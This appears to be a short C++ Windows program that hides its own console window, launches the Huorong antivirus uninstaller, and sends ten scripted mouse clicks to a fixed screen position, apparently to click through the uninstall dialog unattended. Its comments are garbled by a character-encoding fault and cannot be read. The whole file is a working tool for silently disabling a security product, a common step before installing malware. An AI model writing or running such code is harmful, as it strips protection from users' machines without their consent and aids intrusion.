#include <iostream>
#include <thread>
#include <windows.h>
using namespace std;
void mousemove(){
	for(int i=1;i<=10;++i){
		Sleep(500);
		SetCursorPos(680,580);//�ƶ���ָ��λ��
		mouse_event(MOUSEEVENTF_LEFTDOWN,0,0,0,0);//�������
		mouse_event(MOUSEEVENTF_LEFTUP,0,0,0,0);//�ɿ����
	}
}
void openfile(){
	char s[]=" \"\"C:\\Program Files (x86)\\Huorong\\Sysdiag\\uninst.exe\"\" ";
	cout << s;
	system(s);
}
void hideconsole(){
	HWND hwnd;
	hwnd=FindWindow("ConsoleWindowClass",NULL);	//���������ڵ������ʹ�������ƥ��ָ�����ַ���,�������Ӵ��ڡ�
	if(hwnd)
	{
		ShowWindow(hwnd,SW_HIDE);				//����ָ�����ڵ���ʾ״̬
	}
}
int main()
{
	hideconsole();
	thread t1(openfile);
	thread t2(mousemove);
	t1.join();
	t2.join();
	return 0;
}
